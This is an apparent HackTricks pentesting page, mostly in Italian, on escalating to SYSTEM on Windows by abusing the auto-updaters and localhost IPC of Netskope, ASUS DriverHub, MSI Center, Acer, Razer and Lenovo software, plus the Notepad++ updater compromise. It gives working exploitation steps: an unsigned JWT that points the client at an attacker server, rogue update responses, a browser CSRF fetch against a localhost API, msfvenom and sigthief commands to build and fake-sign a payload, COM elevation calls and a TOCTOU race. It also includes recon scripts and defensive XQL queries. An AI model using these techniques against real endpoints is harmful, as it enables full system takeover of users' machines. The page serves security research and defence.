# Abusare di Enterprise Auto-Updaters e Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Questa pagina generalizza una classe di catene di Windows local privilege escalation trovate in agent e updater enterprise endpoint che espongono una superficie IPC a bassa frizione e un flusso di aggiornamento privilegiato. Un esempio rappresentativo è Netskope Client for Windows < R129 (CVE-2025-0309), dove un utente con privilegi bassi può costringere la registrazione verso un server controllato dall'attaccante e poi consegnare un MSI malevolo che il servizio SYSTEM installa.

Idee chiave che puoi riutilizzare contro prodotti simili:
- Abusare dell'IPC localhost di un servizio privilegiato per forzare la ri-registrazione o la riconfigurazione verso un server dell'attaccante.
- Implementare gli endpoint di update del vendor, consegnare una rogue Trusted Root CA e puntare l'updater a un package malevolo, “signed”.
- Evadere i deboli controlli sui signer (CN allow-lists), i flag digest opzionali e le proprietà MSI permissive.
- Se l'IPC è “encrypted”, derivare la key/IV da identificatori della macchina leggibili da tutti memorizzati nel registry.
- Se il servizio limita i chiamanti in base al path dell'immagine/process name, injectare in un processo allow-listed oppure avviarne uno suspended e fare bootstrap della propria DLL tramite un patch minimale del thread context.

---
## 1) Forzare la registrazione verso un server dell'attaccante tramite IPC localhost

Molti agent includono un processo UI in user-mode che comunica con un servizio SYSTEM tramite localhost TCP usando JSON.

Osservato in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flusso di exploit:
1) Costruire un JWT enrollment token le cui claims controllano l'host backend (e.g., AddonUrl). Usare alg=None così non è richiesta alcuna signature.
2) Inviare il messaggio IPC invocando il comando di provisioning con il tuo JWT e il tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Il servizio inizia a contattare il tuo rogue server per enrollment/config, ad esempio:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- Se la verifica del caller è basata su path/name, origina la richiesta da un binary vendor allow-listed (vedi §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Una volta che il client parla con il tuo server, implementa gli endpoint previsti e indirizzalo verso un attacker MSI. Sequenza tipica:

1) /v2/config/org/clientconfig → Restituisci una JSON config con un updater interval molto breve, ad es.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Restituisce un certificato CA PEM. Il servizio lo installa nello store Local Machine Trusted Root.
3) /v2/checkupdate → Fornisci metadati che puntano a un MSI malevolo e a una finta versione.

Bypassing common checks seen in the wild:
- Signer CN allow-list: il servizio può controllare solo che il Subject CN sia uguale a “netSkope Inc” o “Netskope, Inc.”. La tua rogue CA può emettere un leaf con quel CN e firmare l'MSI.
- CERT_DIGEST property: includi una proprietà MSI benigna chiamata CERT_DIGEST. Nessuna enforcement all'installazione.
- Optional digest enforcement: config flag (ad es. check_msi_digest=false) disabilita la validazione crittografica extra.

Result: il servizio SYSTEM installa il tuo MSI da
C:\ProgramData\Netskope\stAgent\data\*.msi
eseguendo codice arbitrario come NT AUTHORITY\SYSTEM.

Patch-bypass lesson: se un vendor risponde allow-listando un piccolo set di domini “trusted” invece di autenticare crittograficamente la sorgente dell'update, cerca redirector o reverse proxy di proprietà del vendor che ancora ti permettano di steer traffic. Nel caso di Netskope, una ricerca pubblica successiva mostrò che una allow-list dell’era R129 poteva ancora essere abusata tramite `rproxy.goskope.com`, che faceva proxy di contenuti Azure App Service controllati dall'attaccante. Tratta gli hostname allow-list come un rallentamento, non come un trust boundary.

---
## 3) Forging encrypted IPC requests (when present)

Da R127, Netskope avvolgeva il JSON IPC in un campo encryptData che sembra Base64. Il reversing ha mostrato AES con key/IV derivati da valori di registry leggibili da qualsiasi user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Gli attacker possono riprodurre la cifratura e inviare validi comandi cifrati da un standard user. Suggerimento generale: se un agent improvvisamente “cifra” il suo IPC, cerca device ID, GUID di prodotto, install ID sotto HKLM come materiale.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Alcuni servizi provano ad autenticare il peer risolvendo il PID della connessione TCP e confrontando il path/name dell'immagine con binary del vendor allow-listati sotto Program Files (ad es. stagentui.exe, bwansvc.exe, epdlp.exe).

Due bypass pratici:
- DLL injection in un processo allow-listato (ad es. nsdiag.exe) e proxy IPC dall'interno.
- Avvia un binary allow-listato sospeso e bootstrap la tua proxy DLL senza CreateRemoteThread (vedi §5) per soddisfare le regole di tamper enforce dal driver.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

I prodotti spesso includono un driver minifilter/OB callbacks (ad es. Stadrv) per rimuovere diritti pericolosi dagli handle verso processi protetti:
- Process: rimuove PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: limita a THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un loader user-mode affidabile che rispetta questi vincoli:
1) CreateProcess di un binary del vendor con CREATE_SUSPENDED.
2) Ottieni gli handle che ti sono ancora consentiti: PROCESS_VM_WRITE | PROCESS_VM_OPERATION sul process, e un thread handle con THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (oppure solo THREAD_RESUME se patchi il code a un RIP noto).
3) Sovrascrivi ntdll!NtContinue (o un altro thunk early, sicuramente mapped) con un piccolo stub che chiama LoadLibraryW sul path della tua DLL, poi torna indietro.
4) ResumeThread per triggerare il tuo stub in-process, caricando la tua DLL.

Poiché non hai mai usato PROCESS_CREATE_THREAD o PROCESS_SUSPEND_RESUME su un processo già protetto (lo hai creato tu), la policy del driver è soddisfatta.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatizza una rogue CA, la firma di MSI malevoli, e serve gli endpoint necessari: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope è un custom IPC client che costruisce messaggi IPC arbitrari (opzionalmente cifrati AES) e include l'injection di suspended-process per originare da un binary allow-listato.

## 7) Fast triage workflow for unknown updater/IPC surfaces

Quando affronti un nuovo endpoint agent o una suite “helper” per motherboard, un workflow rapido di solito basta per capire se hai davanti un target privesc promettente:

1) Enumera i listener di loopback e mappali ai processi del vendor:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Enumerare i named pipes candidati:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Estrarre i dati di routing supportati dal registro usati dai server IPC basati su plugin:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Estrai prima i nomi degli endpoint, le chiavi JSON e gli ID dei comandi dal client in user-mode. I frontend Electron/.NET packed spesso rivelano l’intero schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Cerca il vero predicato di fiducia, non solo il code path che alla fine avvia il processo:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Pattern da prioritizzare:
- `CryptQueryObject`/certificate parsing senza `WinVerifyTrust` di solito significa che “certificate exists” è stato trattato come “certificate is trusted”, consentendo certificate cloning o altri fake-signer trick.
- Controlli di substring/suffix su `Origin`, `Referer`, download URLs, nomi di processi o signer CN non sono autenticazione. `contains(".vendor.com")` è di solito sfruttabile con attacker-controlled lookalike domains.
- Se la GUI a privilegi bassi decide “the file is trusted” e il broker SYSTEM si limita a consumare quel risultato, patchare o reimplementare la client-side DLL/JS spesso bypassa l’intero boundary (Razer-style split validation).
- Se il broker copia un payload in `%TEMP%`/`C:\Windows\Temp` e poi lo valida o lo schedula da quel path, testa subito per TOCTOU replacement windows e per sibling plugin modules che espongono wrapper `ExecuteTask()` alternativi con controlli più deboli.

Per target molto basati su named-pipe, PipeViewer è un modo rapido per individuare weak DACLs e pipe raggiungibili da remoto prima di iniziare a reverse-engineerare il protocollo in profondità.

Se il target autentica i chiamanti solo tramite PID, image path o process name, consideralo un speed bump più che un boundary: injectare nel client legittimo, o fare la connessione da un processo allow-listed, spesso basta per soddisfare i controlli del server. Per named pipes in particolare, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) copre il primitive in modo più approfondito.

---
## 8) Modular add-in brokers authenticated only by vendor signatures (Lenovo Vantage pattern)

Una variazione più recente che vale la pena cercare è il **signed-client RPC broker**: un processo desktop Lenovo-signed a privilegi bassi parla con un servizio SYSTEM, e il servizio instrada comandi JSON verso un insieme di add-in descritti in XML sotto `%ProgramData%`. Una volta ottenuta l’esecuzione di codice **all’interno di qualsiasi signed client accettato**, ogni contratto `runas="system"` diventa parte della tua attack surface.

Primitive ad alto valore osservate nella ricerca su Lenovo Vantage:
- **Trusting the caller because it is signed by the vendor**: i ricercatori hanno raggiunto un contesto autenticato copiando un EXE Lenovo-signed in una directory scrivibile e soddisfacendo un DLL side-load (`profapi.dll`) in modo che codice arbitrario girasse dentro un client già trusted dal servizio.
- **Manifest-driven attack surface discovery**: gli add-in sono dichiarati in `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; diversi contract girano come `SYSTEM`, quindi enumerare quei manifest spesso rivela i veri privileged verbs molto più velocemente del reverse-engineering del broker stesso.
- **Per-command bugs behind the authenticated channel**: una volta dentro il client trusted, la ricerca pubblica ha trovato path-traversal + race conditions nei verb di update/install, abuso di raw-SQL in database di impostazioni privilegiati, e controlli di substring sui percorsi di registry che permettevano scritture fuori dall’hive previsto.

Useful recon on a target:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Practical takeaway: whenever a helper suite exposes a broker that first authenticates the **caller process** and only then dispatches into dozens of plugin/add-in commands, do not stop after bypassing the front-door trust check. Dump the manifest/contract table and fuzz each high-privilege verb independently; the authenticated channel usually hides several second-stage bugs.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub ships a user-mode HTTP service (ADU.exe) on 127.0.0.1:53000 that expects browser calls coming from https://driverhub.asus.com. The origin filter simply performs `string_contains(".asus.com")` over the Origin header and over download URLs exposed by `/asus/v1.0/*`. Any attacker-controlled host such as `https://driverhub.asus.com.attacker.tld` therefore passes the check and can issue state-changing requests from JavaScript. See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) for additional bypass patterns.

Practical flow:
1) Register a domain that embeds `.asus.com` and host a malicious webpage there.
2) Use `fetch` or XHR to call a privileged endpoint (e.g., `Reboot`, `UpdateApp`) on `http://127.0.0.1:53000`.
3) Send the JSON body expected by the handler – the packed frontend JS shows the schema below.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Anche la CLI di PowerShell mostrata sotto riesce quando l'header Origin viene spoofato con il valore attendibile:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Qualsiasi visita del browser al sito dell’attaccante diventa quindi un local CSRF a 1-click (o 0-click tramite `onload`) che avvia un helper SYSTEM.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` scarica eseguibili arbitrari definiti nel body JSON e li memorizza in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validazione della URL di download riutilizza la stessa logica basata su substring, quindi `http://updates.asus.com.attacker.tld:8000/payload.exe` viene accettato. Dopo il download, ADU.exe controlla solo che il PE contenga una signature e che la stringa Subject corrisponda a ASUS prima di eseguirlo – nessun `WinVerifyTrust`, nessuna chain validation.

Per weaponize il flusso:
1) Crea un payload (ad esempio, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clona il signer di ASUS dentro di esso (ad esempio, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Ospita `pwn.exe` su un domain simile a `.asus.com` e attiva UpdateApp tramite il browser CSRF sopra.

Poiché sia i filtri Origin sia quelli URL sono basati su substring e il controllo del signer confronta solo stringhe, DriverHub scarica ed esegue il binary dell’attaccante nel proprio contesto elevato.

---
## 1) TOCTOU dentro i percorsi copy/execute dell’updater (MSI Center CMD_AutoUpdateSDK)

Il servizio SYSTEM di MSI Center espone un protocollo TCP in cui ogni frame è `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Il componente core (Component ID `0f 27 00 00`) include `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Il suo handler:
1) Copia l’eseguibile fornito in `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifica la signature tramite `CS_CommonAPI.EX_CA::Verify` (il certificate subject deve essere “MICRO-STAR INTERNATIONAL CO., LTD.” e `WinVerifyTrust` deve avere successo).
3) Crea un scheduled task che esegue il file temporaneo come SYSTEM con argomenti controllati dall’attaccante.

Il file copiato non viene bloccato tra la verifica e `ExecuteTask()`. Un attaccante può:
- Inviare Frame A che punta a un binary MSI legittimo (garantisce che il controllo della signature passi e che il task venga accodato).
- Fare race con messaggi Frame B ripetuti che puntano a un payload malevolo, sovrascrivendo `MSI Center SDK.exe` subito dopo il completamento della verifica.

Quando lo scheduler parte, esegue il payload sovrascritto come SYSTEM nonostante abbia validato il file originale. Un exploit affidabile usa due goroutine/thread che spammando `CMD_AutoUpdateSDK` finché la finestra TOCTOU non viene vinta.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Ogni plugin/DLL caricato da `MSI.CentralServer.exe` riceve un Component ID memorizzato in `HKLM\SOFTWARE\MSI\MSI_CentralServer`. I primi 4 byte di un frame selezionano quel componente, consentendo agli attaccanti di instradare i comandi verso moduli arbitrari.
- I plugin possono definire i propri task runner. `Support\API_Support.dll` espone `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` e richiama direttamente `API_Support.EX_Task::ExecuteTask()` senza **alcuna** validazione della signature – qualunque utente locale può puntarlo a `C:\Users\<user>\Desktop\payload.exe` e ottenere esecuzione SYSTEM in modo deterministico.
- Sniffare il loopback con Wireshark o strumentare i binary .NET in dnSpy rivela rapidamente il mapping Component ↔ command; client Go/ Python custom possono poi riprodurre i frame.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) espone `\\.\pipe\treadstone_service_LightMode`, e il suo ACL discrezionale consente client remoti (ad esempio, `\\TARGET\pipe\treadstone_service_LightMode`). Inviare il command ID `7` con un file path invoca la routine di process spawning del servizio.
- La client library serializza un magic terminator byte (113) insieme agli argomenti. La strumentazione dinamica con Frida/`TsDotNetLib` (vedi [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) per consigli sulla strumentazione) mostra che l’handler nativo mappa questo valore a un `SECURITY_IMPERSONATION_LEVEL` e a un integrity SID prima di chiamare `CreateProcessAsUser`.
- Sostituire 113 (`0x71`) con 114 (`0x72`) porta al branch generico che mantiene il token SYSTEM completo e imposta un high-integrity SID (`S-1-16-12288`). Il binary avviato quindi gira come SYSTEM senza restrizioni, sia localmente sia tra macchine diverse.
- Combina tutto questo con il flag di installer esposto (`Setup.exe -nocheck`) per avviare ACC anche su VM di laboratorio e usare la pipe senza hardware del vendor.

Questi bug IPC evidenziano perché i servizi localhost devono imporre autenticazione reciproca (ALPC SID, filtri `ImpersonationLevel=Impersonation`, token filtering) e perché ogni helper “run arbitrary binary” di un modulo deve condividere le stesse verifiche di signer.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 ha aggiunto un altro pattern utile a questa famiglia: un user a privilegi bassi può chiedere a un helper COM di lanciare un processo tramite `RzUtility.Elevator`, mentre la decisione di trust viene delegata a una DLL in user-mode (`simple_service.dll`) invece di essere applicata in modo robusto dentro il boundary privilegiato.

Percorso di exploitation osservato:
- Istanzia l’oggetto COM `RzUtility.Elevator`.
- Chiama `LaunchProcessNoWait(<path>, "", 1)` per richiedere un avvio elevato.
- Nel PoC pubblico, il gate della PE-signature dentro `simple_service.dll` viene patchato prima di inviare la richiesta, consentendo di lanciare un eseguibile arbitrario scelto dall’attaccante.

Minima invocation PowerShell:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Takeaway generale: quando fai reversing di suite “helper”, non fermarti a localhost TCP o named pipes. Controlla classi COM con nomi come `Elevator`, `Launcher`, `Updater` o `Utility`, poi verifica se il servizio privilegiato valida davvero il binary target oppure si fida solo di un risultato calcolato da una user-mode client DLL patchabile. Questo pattern va oltre Razer: qualsiasi design split in cui il broker ad alto privilegio consuma una decisione allow/deny dalla parte a basso privilegio è un possibile surface di privesc.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Tra giugno 2025 e dicembre 2025, attacker che hanno compromesso l’infrastruttura di hosting dietro il flusso di update di Notepad++ hanno servito selettivamente manifest maliziosi a vittime scelte. I vecchi updater basati su WinGUp non verificavano completamente l’autenticità degli update, quindi una risposta XML ostile poteva reindirizzare i client verso URL controllati dall’attacker. Poiché il client accettava contenuto HTTPS senza imporre sia una trusted certificate chain sia una valida PE signature sull’installer scaricato, le vittime scaricavano ed eseguivano un trojanized NSIS `update.exe`.

Flusso operativo (nessun local exploit richiesto):
1. **Infrastructure interception**: compromettere CDN/hosting e rispondere ai controlli di update con metadata dell’attacker che punta a un malicious download URL.
2. **Trojanized NSIS**: l’installer scarica/esegue un payload e abusa di due execution chain:
- **Bring-your-own signed binary + sideload**: includere il signed Bitdefender `BluetoothService.exe` e depositare un malicious `log.dll` nel suo search path. Quando il signed binary viene eseguito, Windows fa sideload di `log.dll`, che decifra e carica reflectively il Chrysalis backdoor (protetto con Warbird + API hashing per ostacolare il static detection).
- **Scripted shellcode injection**: NSIS esegue uno script Lua compilato che usa Win32 APIs (es. `EnumWindowStationsW`) per injectare shellcode e stanziare Cobalt Strike Beacon.

Hardening/detection takeaways per qualsiasi auto-updater:
- Imporre **certificate + signature verification** dell’installer scaricato (pin del vendor signer, rifiutare CN/chain non corrispondenti) e firmare il manifest dell’update stesso (es. XMLDSig). Bloccare i redirect controllati dal manifest se non validati.
- Trattare il **BYO signed binary sideloading** come un pivot di detection post-download: allertare quando un signed vendor EXE carica un nome DLL proveniente da fuori del suo canonical install path (es. Bitdefender che carica `log.dll` da Temp/Downloads) e quando un updater deposita/esegue installer da temp con firme non vendor.
- Monitorare gli **malware-specific artifacts** osservati in questa chain (utili come generic pivot): mutex `Global\Jdhfv_1.0.1`, scritture anomale di `gup.exe` in `%TEMP%`, e stage di shellcode injection guidati da Lua.
- Notepad++ ha risposto rafforzando WinGUp in v8.8.9 e versioni successive: l’XML restituito è ora firmato (XMLDSig), e i build più recenti impongono certificate + signature verification dell’installer scaricato invece di fidarsi solo del transport.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> che avvia un installer non di Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Questi pattern si generalizzano a qualsiasi updater che accetta manifest non firmati o non riesce a fissare i signer dell’installer—network hijack + malicious installer + BYO-signed sideloading produce remote code execution sotto le mentite spoglie di aggiornamenti “trusted”.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
